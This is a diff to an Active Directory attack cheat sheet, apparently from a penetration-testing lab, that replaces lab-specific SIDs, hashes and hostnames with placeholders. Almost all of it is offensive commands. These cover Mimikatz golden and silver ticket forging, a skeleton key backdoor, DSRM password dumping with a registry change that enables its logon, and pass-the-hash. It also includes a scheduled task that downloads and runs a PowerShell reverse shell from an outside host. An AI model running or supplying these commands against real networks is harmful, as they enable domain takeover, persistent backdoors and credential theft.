@@ -513,7 +513,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
 Use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process
 To get the SID use ```Get-DomainSID``` from powerview
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:<domain sid> /krbtgt:<hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 
 #### Use the DCSync feature for getting krbtgt hash. Execute with DA privileges
@@ -531,11 +531,10 @@ Interesting read: https://adsecurity.org/?p=2011
 #### Make silver ticket for CIFS
 Use the hash of the local computer
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:f3daa97a026858a2665f17a4a83a150a /user:Administrator /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:CIFS /rc4:<local computer hash> /user:Administrator /ptt"'
 ```
 
 #### Check access (After CIFS silver ticket)
-Use the hash of the local computer
 ```
 ls \\servername\c$\
 ```
@@ -543,27 +542,27 @@ ls \\servername\c$\
 #### Make silver ticket for Host
 Use the hash of the local computer
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:f3daa97a026858a2665f17a4a83a150a /user:Administrator /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
 ```
 
 #### Schedule and execute a task (After host silver ticket)
 ```
-schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Reverse" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.244/Invoke-PowerShellTcp.ps1''')'"
+schtasks /create /S <target> /SC Weekly /RU "NT Authority\SYSTEM" /TN "Reverse" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''')'"
 
-schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN “Reverse”
+schtasks /Run /S <target> /TN “Reverse”
 ```
 
 #### Make silver ticket for WMI
 Execute for WMI /service:HOST /service:RPCSS
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:f3daa97a026858a2665f17a4a83a150a /user:Administrator /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
 
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:f3daa97a026858a2665f17a4a83a150a /user:Administrator /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:RPCSS /rc4:<local computer hash> /user:Administrator /ptt"'
 ```
 
 #### Check WMI Permission
 ```
-Get-wmiobject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
 ```
 
 ## Skeleton key
@@ -572,29 +571,30 @@ Leaves a big gap in their security because you can login on any user with the pa
 
 #### Create the skeleton key - Requires DA admin
 ```
-Invoke-MimiKatz -Command '"privilege::debug" "misc::skeleton"' -Computername dcorp-dc.dollarcorp.moneycorp.local
+Invoke-MimiKatz -Command '"privilege::debug" "misc::skeleton"' -Computername <target>
 ```
 
 ## DSRM
 Directory Services Restore Mode
 
 #### Dump DSRM password - dumps local users
+look for the local administrator password
 ```
-#look for the local administrator password
-Invoke-Mimikatz -Command ‘”token::elevate” “lsadump::sam”’ -Computername dcorp-dc
+Invoke-Mimikatz -Command ‘”token::elevate” “lsadump::sam”’ -Computername <target>
 ```
 
 #### Change login behavior for the local admin on the DC
 ```
 New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD
-
-#If already exists
+```
+#### If already exists
+```
 Set-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2
 ```
 
 #### Pass the hash for local admin
 ```
-Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<domain> /user:Administrator /ntlm:<hash> /run:powershell.exe"'
 ```
 
 ## Custom SSP - Track logons
@@ -1035,7 +1035,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded – Verbose
 
 #### Gather information
 ```
-Get-SQLInstanceDomain | Get SQLServerInfo -Verbose
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 ```
 
 #### Search for links to remote servers
